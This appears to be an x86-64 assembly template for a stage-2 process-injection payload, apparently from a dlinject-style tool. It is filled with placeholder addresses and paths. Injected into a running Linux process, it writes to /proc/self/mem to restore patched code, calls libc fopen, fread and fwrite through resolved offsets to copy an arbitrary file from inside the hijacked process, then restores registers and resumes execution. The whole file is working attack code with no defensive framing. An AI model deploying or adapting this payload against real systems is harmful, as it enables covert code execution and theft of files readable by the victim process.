.intel_syntax noprefix
.globl _start
_start:

// Based on the stage 2 code included with dlinject.py
// and in part on https://stackoverflow.com/questions/37940707/read-and-write-to-file-assembly
// relative offsets for the following libraries required:
//		libc
//			tested specifically with libc-2.31.so
cld

	fxsave moar_regs[rip]

	// Open /proc/self/mem
	mov rax, 2                   # SYS_OPEN
	lea rdi, proc_self_mem[rip]  # path
	mov rsi, 2                   # flags (O_RDWR)
	xor rdx, rdx                 # mode
	syscall
	mov r15, rax  # save the fd for later

	// seek to code
	mov rax, 8      # SYS_LSEEK
	mov rdi, r15    # fd
	mov rsi, [VARIABLE:RIP:VARIABLE]  # offset
	xor rdx, rdx    # whence (SEEK_SET)
	syscall

	// restore code
	mov rax, 1                   # SYS_WRITE
	mov rdi, r15                 # fd
	lea rsi, old_code[rip]       # buf
	mov rdx, [VARIABLE:LEN_CODE_BACKUP:VARIABLE]   # count
	syscall

	// close /proc/self/mem
	mov rax, 3    # SYS_CLOSE
	mov rdi, r15  # fd
	syscall

	// move pushed regs to our new stack
	lea rdi, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	mov rsi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	// restore original stack
	mov rdi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	lea rsi, old_stack[rip]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	
	// BEGIN: call LIBC fopen against the source file
	push rbx
	lea rax, sourcefile[rip]
	lea rdi, sourcefile[rip]
    lea rsi, read_only_string[rip]
    mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:fopen@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
    mov r13, rax          # store file descriptor in r13 rather than a variable to avoid attempts to write to executable memory
	pop rbx
	// END: call LIBC fopen
	
	// BEGIN: call LIBC fopen against the destination file
	push r13
	push rbx
	lea rax, destfile[rip]
	lea rdi, destfile[rip]
    lea rsi, write_only_string[rip]
    mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:fopen@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
    mov r14, rax          # store file descriptor in r14 rather than a variable to avoid attempts to write to executable memory
	pop rbx
	pop r13
	// END: call LIBC fopen

	// push rax onto the stack 8 times (= 64 bytes) to use as a copy buffer
	// instead of using a variable defined in this file, because that would result in writing to executable memory
	mov rax, 0
	push rax
	push rax
	push rax
	push rax
	push rax
	push rax
	push rax
	push rax
	mov r15, rsp

copyLoop:

	// BEGIN: call LIBC fread against the source file
	push r13
	push r14
	push r15
	push rbx
	mov rcx, r13	# file descriptor
	mov rdx, 64		# number of elements
	mov esi, 1		# element size
	mov rax, r15	# buffer
	mov rdi, rax
    mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:fread@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
    mov r12, rax    # result
	pop rbx
	pop r15
	pop r14
	pop r13
	// END: call LIBC fread
	
	// if no bytes were read (usually end-of-file), processing is complete
	cmp r12, 0
	jle doneCopying
	
	// BEGIN: call LIBC fwrite against the destination file with the number of elements read by fread()
	push r13
	push r14
	push r15
	push rbx
	mov rcx, r14	# file descriptor
	mov rdx, r12	# number of elements
	mov esi, 1		# element size
	mov rax, r15	# buffer
	mov rdi, rax
    mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:fwrite@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
    mov r12, rax    # result
	pop rbx
	pop r15
	pop r14
	pop r13
	// END: call LIBC fwrite

	jmp copyLoop

doneCopying:

	// discard the buffer stack variables
	pop rax
	pop rax
	pop rax
	pop rax
	pop rax
	pop rax
	pop rax
	pop rax

	// close file handles using fclose()
	
	// BEGIN: call LIBC fclose against the destination file with the number of elements read by fread()
	push r14
	push rbx
	mov rax, r13	# file descriptor
	mov rdi, rax
    mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:fclose@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r14
	// END: call LIBC fclose
	
	// BEGIN: call LIBC fclose against the destination file with the number of elements read by fread()
	push rbx
	mov rax, r14	# file descriptor
	mov rdi, rax
    mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:fclose@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call LIBC fclose
	
	
	
	fxrstor moar_regs[rip]
	
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rbp
	pop rdx
	pop rcx
	pop rbx
	pop rax
	
	popf

	mov rsp, [VARIABLE:RSP:VARIABLE]
	
	jmp old_rip[rip]

old_rip:
	.quad [VARIABLE:RIP:VARIABLE]
	.align 16

old_code:
	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]

old_stack:
	.byte [VARIABLE:STACK_BACKUP_JOIN:VARIABLE]

	.align 16
moar_regs:
	.space 512

proc_self_mem:
	.ascii "/proc/self/mem\0"
	
sourcefile:
	.ascii "[VARIABLE:sourcefile:VARIABLE]\0"

destfile:
	.ascii "[VARIABLE:destfile:VARIABLE]\0"

format_string:
	.ascii "DEBUG: %s\n\0"
	
read_only_string:
	.ascii "r\0"

write_only_string:
	.ascii "w\0"
	
new_stack:
	.balign 0x8000

new_stack_base:

